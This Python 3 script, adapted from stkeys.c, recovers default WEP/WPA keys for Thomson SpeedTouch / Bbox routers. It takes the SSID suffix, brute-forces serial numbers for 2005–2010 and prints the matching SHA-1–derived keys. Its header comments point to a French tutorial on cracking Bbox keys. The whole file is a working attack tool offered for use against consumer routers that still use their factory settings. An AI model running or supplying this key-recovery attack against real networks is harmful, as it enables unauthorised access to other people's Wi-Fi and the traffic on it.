#!/usr/bin/python3
#-*- coding: utf8 -*-
#
# Python version of stkeys.c by Kevin Devine (see http://weiss.u40.hosting.digiweb.ie/stech/)
#
# This script will generate possible WEP/WPA keys for Thomson SpeedTouch / BT Home Hub routers,
# given the last 4 or 6 characters of the default SSID. E.g. For SSID 'SpeedTouchF8A3D0' run:
#
# ./ssid2key.py f8a3d0
#
# By Hubert Seiwert, hubert.seiwert@nccgroup.com 2008-04-17
#
# Script modifie pour fonctionner avec les BBox
# http://samoht.fr
# Telecharge depuis l article original http://samoht.fr/tuto/tuto-crack-de-cle-wep-et-wpa-bbox
# Lien pour telecharger ce fichier : http://bit.ly/12Ie2IN
#
# Script modifié par killruana pour être compatible avec python 3


import hashlib
import re
import sys

def extract_ssid_end_from_ssid(ssid):
    result = re.search("(Bbox-)?(?P<id>[0-9A-F]{6})", ssid)
    if result is None:
        return None

    return result.group("id")

def ascii2hex(char):
    return hex(ord(char))[2:]

def search_keys(ssid_end):
    # Initialization data
    offset = 40 - len(ssid_end)
    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    years = range(2005, 2011)
    weeks = range(1, 53)


    #  Prepare initialization dada
    years = list(map(lambda x: x - 2000, years))
    charset = list(map(lambda x: str(hex(ord(x))[2:]).upper(), charset))
    ssid_end = ssid_end.lower()


    # Searching keys.
    for year in years:
        for week in weeks:
            for char1 in charset:
                for char2 in charset:
                    for char3 in charset:
                        serial_number = "CP{0:02}{1:02}{2}{3}{4}".format(year, week, char1, char2, char3)
                        serial_number_encoded = serial_number.encode('utf-8')
                        serial_number_hash = hashlib.sha1(serial_number_encoded).hexdigest()
                        if serial_number_hash[offset:] == ssid_end:
                            yield serial_number_hash[:10].upper()


if len(sys.argv) != 2:
    sys.exit("Usage: ./bboxkeys.py <ssid>")

ssid = sys.argv[1]
ssid_end = extract_ssid_end_from_ssid(ssid)
if ssid_end is None:
    sys.exit("SSID {0} doesn't look like as a valid BBox SSID".format(ssid))

print("Searching key for SSID {0}…".format(ssid))
keys = tuple(search_keys(ssid_end))
keys_count = len(keys)
if keys_count == 0:
    print("No keys found")
else:
    print("{0} keys found:".format(keys_count))
    for key in keys:
        print(key)